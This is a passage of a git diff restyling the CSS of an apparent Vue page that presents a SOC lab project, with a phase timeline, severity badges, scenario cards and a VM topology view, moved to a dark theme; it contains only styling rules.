-  border-radius: 12px;
-  background: rgba(8, 3, 14, 0.9);
-  border: 1px solid rgba(233, 84, 32, 0.2);
+  max-width: 760px;
+  margin: 0 auto 52px;
+  padding: 12px 20px;
+  border-radius: 14px;
+  background: #09040e;
+  border: 1px solid rgba(233, 84, 32, 0.35);
   font-family: 'Ubuntu Mono', 'Fira Code', monospace;
-  font-size: 13px;
-  box-shadow: 0 8px 28px rgba(44, 0, 30, 0.14);
+  font-size: 13.5px;
+  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.08);
 }
 
 .term-prompt { color: #10b981; font-weight: 700; white-space: nowrap; }
-.term-cmd    { color: rgba(255,255,255,0.82); flex: 1; }
-.term-cursor { color: #e95420; animation: blink 0.9s step-end infinite; }
+.term-cmd    { color: #f1f5f9; flex: 1; font-weight: 500; }
+.term-cursor { color: #ff6b35; animation: blink 0.9s step-end infinite; }
 
 @keyframes blink {
   0%, 100% { opacity: 1; }
@@ -840,7 +1322,7 @@ onBeforeUnmount(() => {
 ══════════════════════════════════════════════ */
 .soc-timeline-track {
   position: relative;
-  max-width: 1100px;
+  max-width: 1200px;
   margin: 0 auto;
 }
 
@@ -851,18 +1333,19 @@ onBeforeUnmount(() => {
   bottom: 0;
   left: 50%;
   transform: translateX(-50%);
-  width: 3px;
-  background: rgba(119, 33, 111, 0.12);
-  border-radius: 3px;
+  width: 4px;
+  background: rgba(233, 84, 32, 0.15);
+  border-radius: 4px;
   z-index: 1;
   overflow: hidden;
 }
 
 .soc-center-line__fill {
   width: 100%;
-  background: linear-gradient(180deg, #e95420 0%, #77216f 55%, #c48abc 100%);
-  border-radius: 3px;
-  transition: height 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+  height: 100%;
+  background: linear-gradient(180deg, #e95420 0%, #a855f7 50%, #e95420 100%);
+  border-radius: 4px;
+  box-shadow: 0 0 12px rgba(233, 84, 32, 0.6);
 }
 
 /* ══════════════════════════════════════════════
@@ -870,30 +1353,22 @@ onBeforeUnmount(() => {
 ══════════════════════════════════════════════ */
 .soc-phase-row {
   display: grid;
-  grid-template-columns: 1fr 64px 1fr;
+  grid-template-columns: 1fr 72px 1fr;
   gap: 0;
   align-items: start;
-  margin-bottom: 64px;
-  opacity: 0;
-  transform: translateY(40px);
-  transition: opacity 0.55s ease, transform 0.55s cubic-bezier(0.23, 1, 0.32, 1);
-}
-
-.soc-phase-row--visible {
+  margin-bottom: 60px;
   opacity: 1;
-  transform: translateY(0);
 }
 
 /* Lignes paires : carte à gauche, vide à droite */
 .soc-phase-row.phase-row--left .soc-phase-side--empty   { order: 3; }
 .soc-phase-row.phase-row--left .soc-phase-center        { order: 2; }
-.soc-phase-row.phase-row--left .soc-phase-side--content { order: 1; text-align: right; }
-.soc-phase-row.phase-row--left .soc-phase-side--content { padding-right: 28px; }
+.soc-phase-row.phase-row--left .soc-phase-side--content { order: 1; text-align: left; padding-right: 32px; }
 
 /* Lignes impaires : vide à gauche, carte à droite */
 .soc-phase-row.phase-row--right .soc-phase-side--empty   { order: 1; }
 .soc-phase-row.phase-row--right .soc-phase-center        { order: 2; }
-.soc-phase-row.phase-row--right .soc-phase-side--content { order: 3; padding-left: 28px; }
+.soc-phase-row.phase-row--right .soc-phase-side--content { order: 3; text-align: left; padding-left: 32px; }
 
 .soc-phase-side { width: 100%; }
 
@@ -905,14 +1380,14 @@ onBeforeUnmount(() => {
   gap: 8px;
   position: relative;
   z-index: 2;
-  padding-top: 16px;
+  padding-top: 14px;
 }
 
 .soc-phase-number {
   font-family: 'Ubuntu Mono', monospace;
-  font-size: 11px;
-  font-weight: 700;
-  color: rgba(119, 33, 111, 0.5);
+  font-size: 12px;
+  font-weight: 800;
+  color: #ff9d6c;
   letter-spacing: 0.05em;
 }
 
@@ -925,189 +1400,252 @@ onBeforeUnmount(() => {
   place-items: center;
   cursor: pointer;
   border: 2.5px solid;
-  background: #fff;
+  background: #190f23;
   transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.3s;
   flex-shrink: 0;
+  box-shadow: 0 0 16px rgba(0, 0, 0, 0.6);
 }
 
 .soc-phase-marker:hover,
 .soc-phase-marker:focus-visible {
-  transform: scale(1.18);
+  transform: scale(1.2);
   outline: none;
 }
 
 .soc-phase-marker--critical {
-  border-color: #dc2626;
-  color: #dc2626;
-  box-shadow: 0 4px 16px rgba(220, 38, 38, 0.18);
+  border-color: #ef4444;
+  color: #ef4444;
+  box-shadow: 0 0 18px rgba(239, 68, 68, 0.4);
 }
-.soc-phase-marker--critical:hover { box-shadow: 0 0 0 8px rgba(220, 38, 38, 0.14); }
+.soc-phase-marker--critical:hover { box-shadow: 0 0 28px rgba(239, 68, 68, 0.7); }
 
 .soc-phase-marker--high {
   border-color: #e95420;
   color: #e95420;
-  box-shadow: 0 4px 16px rgba(233, 84, 32, 0.18);
+  box-shadow: 0 0 18px rgba(233, 84, 32, 0.4);
 }
-.soc-phase-marker--high:hover { box-shadow: 0 0 0 8px rgba(233, 84, 32, 0.14); }
+.soc-phase-marker--high:hover { box-shadow: 0 0 28px rgba(233, 84, 32, 0.7); }
 
 .soc-phase-marker--medium {
-  border-color: #77216f;
-  color: #77216f;
-  box-shadow: 0 4px 14px rgba(119, 33, 111, 0.14);
+  border-color: #c084fc;
+  color: #c084fc;
+  box-shadow: 0 0 16px rgba(192, 132, 252, 0.35);
 }
-.soc-phase-marker--medium:hover { box-shadow: 0 0 0 8px rgba(119, 33, 111, 0.12); }
+.soc-phase-marker--medium:hover { box-shadow: 0 0 26px rgba(192, 132, 252, 0.6); }
 
 .soc-phase-marker--info {
-  border-color: #005a9c;
-  color: #005a9c;
-  box-shadow: 0 4px 14px rgba(0, 90, 156, 0.12);
+  border-color: #38bdf8;
+  color: #38bdf8;
+  box-shadow: 0 0 16px rgba(56, 189, 248, 0.35);
 }
-.soc-phase-marker--info:hover { box-shadow: 0 0 0 8px rgba(0, 90, 156, 0.1); }
+.soc-phase-marker--info:hover { box-shadow: 0 0 26px rgba(56, 189, 248, 0.6); }
 
 /* ══════════════════════════════════════════════
-   CARTE DE PHASE (glassmorphism)
+   CARTE DE PHASE (glassmorphism sombre haute lisibilité)
 ══════════════════════════════════════════════ */
 .glass-card {
-  background: rgba(255, 255, 255, 0.88);
-  backdrop-filter: blur(14px);
-  -webkit-backdrop-filter: blur(14px);
-  border: 1px solid rgba(119, 33, 111, 0.14);
-  border-radius: 18px;
-  box-shadow: 0 6px 24px rgba(44, 0, 30, 0.07);
-  transition: box-shadow 0.25s, border-color 0.25s;
+  background: rgba(26, 16, 35, 0.94);
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
+  border: 1px solid rgba(233, 84, 32, 0.25);
+  border-radius: 20px;
+  box-shadow: 0 12px 36px rgba(0, 0, 0, 0.45);
+  transition: transform 0.25s ease, border-color 0.25s ease, box-shadow 0.25s ease;
 }
 
 .glass-card:hover {
-  box-shadow: 0 10px 36px rgba(44, 0, 30, 0.12);
-  border-color: rgba(119, 33, 111, 0.28);
+  transform: translateY(-3px);
+  box-shadow: 0 18px 48px rgba(0, 0, 0, 0.6), 0 0 20px rgba(233, 84, 32, 0.15);
+  border-color: rgba(233, 84, 32, 0.5);
 }
 
 .soc-phase-card {
-  padding: 22px 24px;
+  padding: 24px 26px;
 }
 
 .soc-phase-card__meta {
   display: flex;
   flex-wrap: wrap;
   gap: 8px;
-  margin-bottom: 12px;
+  margin-bottom: 14px;
 }
 
 /* Badges de sévérité */
 .severity-badge {
   display: inline-flex;
   align-items: center;
-  gap: 5px;
+  gap: 6px;
   font-size: 11px;
   font-weight: 800;
-  letter-spacing: 0.06em;
+  letter-spacing: 0.08em;
   padding: 4px 10px;
   border-radius: 20px;
   text-transform: uppercase;
 }
 
-.severity-badge--critical { background: #fef2f2; color: #dc2626; border: 1px solid #fca5a5; }
-.severity-badge--high     { background: #fff4ef; color: #e95420; border: 1px solid rgba(233,84,32,0.3); }
-.severity-badge--medium   { background: #f3e8f3; color: #77216f; border: 1px solid rgba(119,33,111,0.28); }
-.severity-badge--info     { background: #eff6ff; color: #1d4ed8; border: 1px solid #bfdbfe; }
+.severity-badge--critical { background: rgba(239, 68, 68, 0.2); color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.5); }
+.severity-badge--high     { background: rgba(233, 84, 32, 0.2); color: #ff9d6c; border: 1px solid rgba(233, 84, 32, 0.5); }
+.severity-badge--medium   { background: rgba(192, 132, 252, 0.2); color: #e9d5ff; border: 1px solid rgba(192, 132, 252, 0.5); }
+.severity-badge--info     { background: rgba(56, 189, 248, 0.2); color: #bae6fd; border: 1px solid rgba(56, 189, 248, 0.5); }
 
 .tool-tag {
   font-size: 11px;
   font-weight: 700;
-  color: #5e2750;
-  background: rgba(94, 39, 80, 0.08);
-  border: 1px solid rgba(94, 39, 80, 0.18);
-  padding: 4px 10px;
+  color: #ffb58a;
+  background: rgba(233, 84, 32, 0.15);
+  border: 1px solid rgba(233, 84, 32, 0.35);
+  padding: 4px 11px;
   border-radius: 20px;
   font-family: 'Ubuntu Mono', monospace;
 }
 
 .soc-phase-card__title {
-  margin: 0 0 10px;
-  font-size: 17px;
+  margin: 0 0 12px;
+  font-size: 18px;
   font-weight: 800;
-  color: #2c001e;
+  color: #ffffff;
   letter-spacing: -0.01em;
   line-height: 1.3;
 }
 
 .soc-phase-card__body {
-  margin: 0 0 14px;
-  font-size: 14px;
-  line-height: 1.65;
-  color: var(--muted);
+  margin: 0 0 16px;
+  font-size: 14.5px;
+  line-height: 1.68;
+  color: rgba(255, 255, 255, 0.82);
+}
+
+/* ══════════════════════════════════════════════
+   IMAGE THUMBNAIL CLIQUABLE
+══════════════════════════════════════════════ */
+.soc-phase-img-btn {
+  display: block;
+  width: 100%;
+  position: relative;
+  border: none;
+  background: #0d0714;
+  padding: 0;
+  margin-bottom: 16px;
+  cursor: zoom-in;
+  border-radius: 12px;
+  overflow: hidden;
+  border: 1px solid rgba(255, 255, 255, 0.12);
+}
+
+.soc-phase-img {
+  display: block;
+  width: 100%;
+  height: 190px;
+  object-fit: cover;
+  border-radius: 12px;
+  transition: transform 0.35s ease;
+}
+
+.soc-phase-img-btn:hover .soc-phase-img {
+  transform: scale(1.04);
+}
+
+.soc-phase-img__overlay {
+  position: absolute;
+  inset: 0;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  background: rgba(13, 7, 20, 0.7);
+  color: #ffffff;
+  font-size: 13px;
+  font-weight: 700;
+  letter-spacing: 0.04em;
+  opacity: 0;
+  transition: opacity 0.25s;
+}
+
+.soc-phase-img-btn:hover .soc-phase-img__overlay,
+.soc-phase-img-btn:focus-visible .soc-phase-img__overlay {
+  opacity: 1;
+}
+
+.soc-phase-img-btn:focus-visible {
+  outline: 2px solid #e95420;
+  outline-offset: 2px;
 }
 
 /* ══════════════════════════════════════════════
    BOX TERMINAL (dark code box)
 ══════════════════════════════════════════════ */
 .soc-term-box {
-  background: #1e1e1e;
-  border-radius: 10px;
+  background: #09040f;
+  border-radius: 12px;
   overflow: hidden;
-  margin-bottom: 14px;
-  border: 1px solid #2d2d2d;
+  margin-bottom: 16px;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.06);
 }
 
 .soc-term-box__bar {
   display: flex;
   align-items: center;
-  gap: 5px;
-  padding: 7px 12px;
-  background: #111;
-  border-bottom: 1px solid #2d2d2d;
+  gap: 6px;
+  padding: 8px 14px;
+  background: #130a1c;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.08);
 }
 
-.dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
-.dot--red    { background: #ff5f56; }
-.dot--yellow { background: #ffbd2e; }
-.dot--green  { background: #27c93f; }
+.dot { width: 9px; height: 9px; border-radius: 50%; flex-shrink: 0; }
+.dot--red    { background: #ef4444; }
+.dot--yellow { background: #f59e0b; }
+.dot--green  { background: #10b981; }
 
 .soc-term-box__label {
   font-family: 'Ubuntu Mono', monospace;
-  font-size: 10px;
-  color: #555;
+  font-size: 11px;
+  color: rgba(255, 255, 255, 0.55);
   margin-left: 8px;
   flex: 1;
 }
 
 .soc-term-box__code {
   margin: 0;
-  padding: 12px 14px;
+  padding: 14px 16px;
   font-family: 'Ubuntu Mono', 'Fira Code', monospace;
-  font-size: 12px;
-  line-height: 1.5;
-  color: #d4d4d4;
+  font-size: 12.5px;
+  line-height: 1.55;
+  color: #e2e8f0;
   white-space: pre-wrap;
   word-break: break-word;
   overflow-x: auto;
 }
 
 .soc-term-box__code--modal {
-  max-height: 360px;
+  max-height: 400px;
   overflow-y: auto;
-  font-size: 12.5px;
+  font-size: 13px;
+  color: #f1f5f9;
 }
 
 /* Bouton logs / playbooks */
 .soc-detail-btn {
   display: inline-flex;
   align-items: center;
-  gap: 7px;
+  gap: 8px;
   font-size: 13px;
   font-weight: 700;
-  color: #77216f;
-  background: rgba(119, 33, 111, 0.07);
-  border: 1px solid rgba(119, 33, 111, 0.2);
-  padding: 7px 14px;
-  border-radius: 10px;
+  color: #ff8a50;
+  background: rgba(233, 84, 32, 0.12);
+  border: 1px solid rgba(233, 84, 32, 0.35);
+  padding: 8px 16px;
+  border-radius: 12px;
   cursor: pointer;
   transition: all 0.2s;
 }
 
 .soc-detail-btn:hover {
-  background: rgba(119, 33, 111, 0.14);
-  border-color: rgba(119, 33, 111, 0.36);
+  background: rgba(233, 84, 32, 0.25);
+  border-color: #e95420;
+  color: #ffffff;
+  transform: translateY(-1px);
 }
 
 /* ══════════════════════════════════════════════
@@ -1118,45 +1656,46 @@ onBeforeUnmount(() => {
   flex-wrap: wrap;
   justify-content: center;
   gap: 0;
-  max-width: 900px;
-  margin: 48px auto 32px;
-  background: rgba(255, 255, 255, 0.88);
-  backdrop-filter: blur(12px);
-  border: 1px solid rgba(119, 33, 111, 0.14);
-  border-radius: 20px;
+  max-width: 980px;
+  margin: 56px auto 36px;
+  background: rgba(24, 14, 32, 0.96);
+  backdrop-filter: blur(14px);
+  border: 1px solid rgba(233, 84, 32, 0.3);
+  border-radius: 22px;
   overflow: hidden;
-  box-shadow: 0 6px 24px rgba(44, 0, 30, 0.07);
+  box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
 }
 
 .soc-kpi {
   flex: 1;
-  min-width: 120px;
+  min-width: 130px;
   display: flex;
   flex-direction: column;
   align-items: center;
-  padding: 22px 16px;
-  border-right: 1px solid rgba(119, 33, 111, 0.1);
+  padding: 24px 16px;
+  border-right: 1px solid rgba(255, 255, 255, 0.08);
   text-align: center;
 }
 
 .soc-kpi:last-child { border-right: none; }
 
 .soc-kpi__value {
-  font-size: 26px;
+  font-size: 28px;
   font-weight: 900;
-  color: #e95420;
+  color: #ff7a45;
   line-height: 1;
   letter-spacing: -0.02em;
-  margin-bottom: 6px;
+  margin-bottom: 8px;
+  text-shadow: 0 0 16px rgba(233, 84, 32, 0.35);
 }
 
 .soc-kpi__label {
-  font-size: 11px;
+  font-size: 11.5px;
   font-weight: 700;
-  color: var(--muted);
+  color: rgba(255, 255, 255, 0.78);
   text-transform: uppercase;
   letter-spacing: 0.06em;
-  line-height: 1.3;
+  line-height: 1.35;
 }
 
 /* ══════════════════════════════════════════════
@@ -1164,14 +1703,16 @@ onBeforeUnmount(() => {
 ══════════════════════════════════════════════ */
 .soc-footer-cta {
   text-align: center;
-  margin-top: 8px;
+  margin-top: 12px;
 }
 
 .soc-pdf-btn {
   display: inline-flex;
   align-items: center;
-  gap: 8px;
+  gap: 9px;
   font-size: 15px;
+  padding: 12px 28px;
+  border-radius: 14px;
 }
 
 /* ══════════════════════════════════════════════
@@ -1180,9 +1721,9 @@ onBeforeUnmount(() => {
 .soc-modal-backdrop {
   position: fixed;
   inset: 0;
-  background: rgba(30, 0, 20, 0.5);
-  backdrop-filter: blur(6px);
-  z-index: 1000;
+  background: rgba(7, 3, 10, 0.82);
+  backdrop-filter: blur(10px);
+  z-index: 3000;
   display: grid;
   place-items: center;
   padding: 24px;
@@ -1190,11 +1731,14 @@ onBeforeUnmount(() => {
 
 .soc-modal {
   width: 100%;
-  max-width: 680px;
-  max-height: 88vh;
+  max-width: 760px;
+  max-height: 90vh;
   overflow-y: auto;
-  padding: 28px;
-  background: rgba(255, 255, 255, 0.97);
+  padding: 32px;
+  background: #170d1e;
+  border: 1px solid rgba(233, 84, 32, 0.35);
+  box-shadow: 0 24px 70px rgba(0, 0, 0, 0.8);
+  border-radius: 22px;
 }
 
 .soc-modal__header {
@@ -1202,74 +1746,77 @@ onBeforeUnmount(() => {
   align-items: center;
   justify-content: space-between;
   flex-wrap: wrap;
-  gap: 10px;
-  margin-bottom: 18px;
+  gap: 12px;
+  margin-bottom: 20px;
 }
 
 .soc-modal__tool {
   font-size: 12px;
   font-weight: 700;
-  color: #5e2750;
-  background: rgba(94, 39, 80, 0.08);
-  border: 1px solid rgba(94, 39, 80, 0.18);
-  padding: 4px 10px;
+  color: #ff9d6c;
+  background: rgba(233, 84, 32, 0.18);
+  border: 1px solid rgba(233, 84, 32, 0.35);
+  padding: 4px 12px;
   border-radius: 20px;
   font-family: 'Ubuntu Mono', monospace;
-  margin-left: 8px;
+  margin-left: 10px;
 }
 
 .soc-modal__close {
-  width: 36px;
-  height: 36px;
+  width: 38px;
+  height: 38px;
   border-radius: 50%;
   display: grid;
   place-items: center;
-  background: rgba(0, 0, 0, 0.06);
-  border: none;
+  background: rgba(255, 255, 255, 0.08);
+  border: 1px solid rgba(255, 255, 255, 0.15);
   cursor: pointer;
-  color: var(--text);
-  transition: background 0.2s;
+  color: #ffffff;
+  transition: all 0.2s;
 }
 
-.soc-modal__close:hover { background: rgba(0, 0, 0, 0.12); }
+.soc-modal__close:hover {
+  background: rgba(233, 84, 32, 0.3);
+  border-color: #e95420;
+}
 
 .soc-modal__title {
-  margin: 0 0 10px;
-  font-size: 20px;
+  margin: 0 0 12px;
+  font-size: 22px;
   font-weight: 800;
-  color: #2c001e;
+  color: #ffffff;
 }
 
 .soc-modal__desc {
-  margin: 0 0 18px;
+  margin: 0 0 20px;
   font-size: 15px;
-  line-height: 1.65;
-  color: var(--muted);
+  line-height: 1.68;
+  color: rgba(255, 255, 255, 0.85);
 }
 
-.soc-modal__details { margin-top: 18px; }
+.soc-modal__details { margin-top: 22px; }
 
 .soc-modal__details h4 {
-  margin: 0 0 10px;
+  margin: 0 0 12px;
   font-size: 14px;
   font-weight: 800;
-  color: #77216f;
+  color: #ff8a50;
   text-transform: uppercase;
-  letter-spacing: 0.06em;
+  letter-spacing: 0.08em;
 }
 
 .soc-modal__details ul {
   margin: 0;
-  padding-left: 20px;
+  padding-left: 22px;
   display: flex;
   flex-direction: column;
-  gap: 6px;
+  gap: 8px;
 }
 
 .soc-modal__details li {
-  font-size: 14px;
-  line-height: 1.5;
-  color: var(--muted);
+  font-size: 14.5px;
+  line-height: 1.55;
+  color: rgba(255, 255, 255, 0.85);
 }
 
 /* ══════════════════════════════════════════════
@@ -1297,21 +1844,375 @@ onBeforeUnmount(() => {
 }
 
 /* ══════════════════════════════════════════════
+   ONGLETS DE NAVIGATION SOC
+══════════════════════════════════════════════ */
+.soc-tab-nav {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 10px;
+  max-width: 860px;
+  margin: 0 auto 36px;
+  padding: 8px;
+  background: rgba(9, 4, 14, 0.85);
+  border: 1px solid rgba(233, 84, 32, 0.28);
+  border-radius: 18px;
+  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+}
+
+.soc-tab-btn {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  padding: 10px 18px;
+  border-radius: 12px;
+  border: 1px solid transparent;
+  background: transparent;
+  color: rgba(255, 255, 255, 0.75);
+  font-family: inherit;
+  font-size: 13.5px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+.soc-tab-btn:hover {
+  color: #ffffff;
+  background: rgba(233, 84, 32, 0.15);
+  border-color: rgba(233, 84, 32, 0.3);
+}
+
+.soc-tab-btn--active {
+  color: #ffffff !important;
+  background: linear-gradient(135deg, rgba(233, 84, 32, 0.9) 0%, rgba(168, 85, 247, 0.85) 100%) !important;
+  border-color: rgba(255, 255, 255, 0.2) !important;
+  box-shadow: 0 6px 20px rgba(233, 84, 32, 0.4);
+}
+
+.soc-tab-count {
+  font-size: 11px;
+  padding: 2px 8px;
+  border-radius: 10px;
+  background: rgba(255, 255, 255, 0.2);
+  color: #fff;
+  font-weight: 800;
+}
+
+/* ══════════════════════════════════════════════
+   VUE SCÉNARIOS DE TEST (4 SCÉNARIOS)
+══════════════════════════════════════════════ */
+.soc-scenarios-view,
+.soc-topology-view {
+  max-width: 1200px;
+  margin: 0 auto 56px;
+  animation: modalFadeIn 0.35s ease;
+}
+
+.soc-scenarios-intro {
+  text-align: center;
+  max-width: 820px;
+  margin: 0 auto 36px;
+}
+
+.soc-scenarios-title {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  margin: 0 0 12px;
+  font-size: 22px;
+  font-weight: 900;
+  color: #ffffff;
+}
+
+.soc-scenarios-desc {
+  margin: 0;
+  font-size: 14.5px;
+  line-height: 1.65;
+  color: rgba(255, 255, 255, 0.78);
+}
+
+.soc-scenarios-desc code {
+  color: #ff9d6c;
+  background: rgba(233, 84, 32, 0.15);
+  padding: 2px 6px;
+  border-radius: 6px;
+  font-family: 'Ubuntu Mono', monospace;
+}
+
+.soc-scenarios-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(520px, 1fr));
+  gap: 28px;
+}
+
+.soc-scenario-card {
+  padding: 28px;
+  display: flex;
+  flex-direction: column;
+  border-radius: 22px;
+}
+
+.soc-sc-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 10px;
+  margin-bottom: 16px;
+}
+
+.soc-sc-tags {
+  display: flex;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 8px;
+}
+
+.soc-sc-number {
+  font-family: 'Ubuntu Mono', monospace;
+  font-size: 11px;
+  font-weight: 800;
+  letter-spacing: 0.08em;
+  color: #ff9d6c;
+  background: rgba(233, 84, 32, 0.15);
+  border: 1px solid rgba(233, 84, 32, 0.35);
+  padding: 3px 9px;
+  border-radius: 8px;
+}
+
+.mitre-tag {
+  font-family: 'Ubuntu Mono', monospace;
+  font-size: 11px;
+  font-weight: 700;
+  color: #c084fc;
+  background: rgba(192, 132, 252, 0.12);
+  border: 1px solid rgba(192, 132, 252, 0.35);
+  padding: 3px 9px;
+  border-radius: 8px;
+}
+
+.soc-sc-status {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 12px;
+  font-weight: 800;
+  color: #34d399;
+  background: rgba(52, 211, 153, 0.15);
+  border: 1px solid rgba(52, 211, 153, 0.4);
+  padding: 4px 10px;
+  border-radius: 20px;
+}
+
+.soc-sc-title {
+  margin: 0 0 10px;
+  font-size: 18px;
+  font-weight: 900;
+  color: #ffffff;
+  line-height: 1.3;
+}
+
+.soc-sc-desc {
+  margin: 0 0 18px;
+  font-size: 14px;
+  line-height: 1.6;
+  color: rgba(255, 255, 255, 0.8);
+}
+
+.soc-sc-meta-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 10px 14px;
+  padding: 16px;
+  border-radius: 14px;
+  background: rgba(10, 5, 16, 0.7);
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  margin-bottom: 18px;
+}
+
+.soc-sc-meta-item {
+  display: flex;
+  flex-direction: column;
+  gap: 3px;
+  font-size: 13px;
+}
+
+.soc-sc-meta-item.full-width {
+  grid-column: 1 / -1;
+}
+
+.soc-sc-meta-label {
+  font-size: 11.5px;
+  font-weight: 800;
+  color: rgba(255, 255, 255, 0.6);
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+}
+
+.soc-sc-meta-val {
+  color: rgba(255, 255, 255, 0.88);
+  line-height: 1.45;
+}
+
+.soc-sc-meta-val.code-text {
+  font-family: 'Ubuntu Mono', monospace;
+  color: #38bdf8;
+  font-size: 12.5px;
+}
+
+.soc-sc-meta-val.highlight-val {
+  color: #34d399;
+  font-weight: 700;
+}
+
+/* ══════════════════════════════════════════════
+   VUE TOPOLOGIE LAB (5 VMs)
+══════════════════════════════════════════════ */
+.soc-topo-diagram-card {
+  padding: 24px;
+  margin-bottom: 32px;
+  border-radius: 20px;
+}
+
+.soc-topo-diagram-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+  margin-bottom: 16px;
+}
+
+.soc-topo-diagram-img {
+  width: 100%;
+  max-height: 420px;
+  object-fit: contain;
+  border-radius: 12px;
+  background: #0d0714;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  cursor: zoom-in;
+  transition: transform 0.3s ease;
+}
+
+.soc-topo-diagram-img:hover {
+  transform: scale(1.01);
+}
+
+.soc-vms-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+  gap: 18px;
+}
+
+.soc-vm-card {
+  padding: 22px;
+  border-radius: 18px;
+  border-top: 3px solid var(--vm-accent, #e95420);
+}
+
+.soc-vm-header {
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+  gap: 10px;
+  margin-bottom: 14px;
+}
+
+.soc-vm-badge {
+  display: inline-block;
+  font-size: 10.5px;
+  font-weight: 800;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  padding: 2px 8px;
+  border-radius: 12px;
+  border: 1px solid;
+  margin-bottom: 6px;
+}
+
+.soc-vm-name {
+  margin: 0;
+  font-size: 16px;
+  font-weight: 800;
+  color: #ffffff;
+  font-family: 'Ubuntu Mono', monospace;
+}
+
+.soc-vm-ip {
+  font-family: 'Ubuntu Mono', monospace;
+  font-size: 12.5px;
+  font-weight: 700;
+  color: var(--vm-accent, #ff9d6c);
+  background: rgba(0, 0, 0, 0.3);
+  padding: 3px 8px;
+  border-radius: 6px;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.soc-vm-meta {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+  font-size: 13px;
+  color: rgba(255, 255, 255, 0.78);
+  margin-bottom: 14px;
+  padding-bottom: 12px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+}
+
+.soc-vm-meta strong {
+  color: #ffffff;
+}
+
+.soc-vm-services-title {
+  display: block;
+  font-size: 11px;
+  font-weight: 800;
+  color: rgba(255, 255, 255, 0.55);
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  margin-bottom: 8px;
+}
+
+.soc-vm-services ul {
+  margin: 0;
+  padding-left: 18px;
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+}
+
+.soc-vm-services li {
+  font-size: 12.5px;
+  color: rgba(255, 255, 255, 0.85);
+  font-family: 'Ubuntu Mono', monospace;
+}
+
+/* ══════════════════════════════════════════════
    RESPONSIVE
 ══════════════════════════════════════════════ */
-@media (max-width: 720px) {
+@media (max-width: 820px) {
+  .soc-scenarios-grid {
+    grid-template-columns: 1fr;
+  }
+  .soc-sc-meta-grid {
+    grid-template-columns: 1fr;
+  }
+  .soc-vms-grid {
+    grid-template-columns: 1fr;
+  }
   .soc-phase-row {
-    grid-template-columns: 40px 1fr;
+    grid-template-columns: 44px 1fr;
     gap: 0 16px;
     margin-bottom: 40px;
   }
 
   .soc-center-line {
-    left: 18px;
+    left: 22px;
     transform: none;
   }
 
-  /* Toutes les cartes à droite sur mobile */
   .soc-phase-row.phase-row--left .soc-phase-side--empty,
   .soc-phase-row.phase-row--right .soc-phase-side--empty {
     display: none;
@@ -1319,17 +2220,17 @@ onBeforeUnmount(() => {
 
   .soc-phase-row.phase-row--left,
   .soc-phase-row.phase-row--right {
-    grid-template-columns: 40px 1fr;
+    grid-template-columns: 44px 1fr;
   }
 
   .soc-phase-row.phase-row--left .soc-phase-center  { order: 1; }
-  .soc-phase-row.phase-row--left .soc-phase-side--content { order: 2; padding-right: 0; text-align: left; }
+  .soc-phase-row.phase-row--left .soc-phase-side--content { order: 2; padding-right: 0; }
   .soc-phase-row.phase-row--right .soc-phase-center { order: 1; }
   .soc-phase-row.phase-row--right .soc-phase-side--content { order: 2; padding-left: 0; }
 
-  .soc-phase-marker { width: 38px; height: 38px; }
+  .soc-phase-marker { width: 42px; height: 42px; }
 
   .soc-results-band { flex-wrap: wrap; }
-  .soc-kpi { min-width: 45%; border-bottom: 1px solid rgba(119,33,111,0.1); }
+  .soc-kpi { min-width: 45%; border-bottom: 1px solid rgba(255,255,255,0.08); }
 }
 </style>
